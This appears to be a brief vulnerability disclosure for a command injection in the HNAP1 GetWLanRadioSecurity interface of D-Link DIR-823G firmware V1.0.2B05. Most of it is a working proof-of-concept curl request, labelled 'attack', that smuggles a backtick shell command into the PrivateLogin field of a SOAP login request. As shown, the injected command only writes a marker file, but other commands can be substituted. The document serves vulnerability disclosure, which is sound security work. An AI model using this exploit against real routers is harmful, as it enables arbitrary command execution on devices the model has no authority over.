```
In the D-Link DIR-823G device with firmware version V1.0.2B05, a command injection vulnerability exists in the HNAP1 protocol. 
Attackers can achieve arbitrary command execution through the GetWLanRadioSecurity interface.
```



<img width="1204" height="567" alt="image" src="https://github.com/user-attachments/assets/6b9f5a96-767d-4bf3-b35e-d165ba91d88a" />



attack:
```
curl -X POST http://192.168.0.1/HNAP1/ \
                    -H "Content-Type: text/xml; charset=utf-8" \
                    -H "SOAPACTION: \"http://purenetworks.com/HNAP1/GetWLanRadioSecurity\"" \
                    -H "X-Requested-With: XMLHttpRequest" \
                    -d '<?xml version="1.0" encoding="utf-8"?><soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><Login xmlns="http://purenetworks.com/HNAP1/"><Action>request</Action><Username>Admin</Username><LoginPassword></LoginPassword><Captcha></Captcha><PrivateLogin>'\''`iwpriv ;echo 111111 > /web_mtn/test.txt  rm_acl_table 1`'\''</PrivateLogin></Login></soap:Body></soap:Envelope>'
```



<img width="587" height="333" alt="image" src="https://github.com/user-attachments/assets/9fb394c9-ad9b-4c22-af95-fb18601d1b05" />
